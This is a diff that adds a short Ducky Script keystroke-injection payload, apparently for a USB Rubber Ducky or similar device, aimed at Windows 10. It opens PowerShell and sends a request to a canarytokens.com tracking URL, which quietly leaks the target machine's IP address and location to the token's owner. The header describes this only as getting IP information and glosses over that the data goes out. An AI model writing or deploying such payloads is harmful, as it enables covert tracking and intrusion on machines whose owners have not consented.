@@ -1,0 +1,12 @@
+REM Title:       Intel - IP
+REM Author:      ₪Ʊןןζ€ (Cylect.io)
+REM Target OS:   Windows 10
+REM Description: This script will get IP information of computer and geolocation.
+
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 1400
+STRING Invoke-WebRequest -Uri http://canarytokens.com/articles/tags/tuc9fhh7swz02vp1xihb1rxe8/contact.php -Method GET;exit
+ENTER
